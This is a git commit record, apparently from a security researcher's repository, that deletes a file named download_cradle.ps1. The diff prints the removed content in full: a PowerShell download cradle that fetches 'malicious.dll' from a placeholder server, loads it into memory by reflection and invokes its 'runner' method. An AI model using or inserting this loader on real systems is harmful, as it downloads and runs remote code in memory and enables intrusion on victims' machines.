52fdcb96e7b9ecbce4eae8dd51563ad0773f0b10
Purpl3F0x <42351007+purpl3f0xsecur1ty@users.noreply.github.com>
2026-03-10 10:19:53 -0400

    Delete download_cradle.ps1

--- download_cradle.ps1
+++
@@ -1,6 +0,0 @@
-$data = (New-Object System.Net.WebClient).DownloadData('http://your_server/malicious.dll')
-
-$assem = [System.Reflection.Assembly]::Load($data)
-$class = $assem.GetType("MaliciousLibrary.MaliciousClass")
-$method = $class.GetMethod("runner")
-$method.Invoke(0, $null)
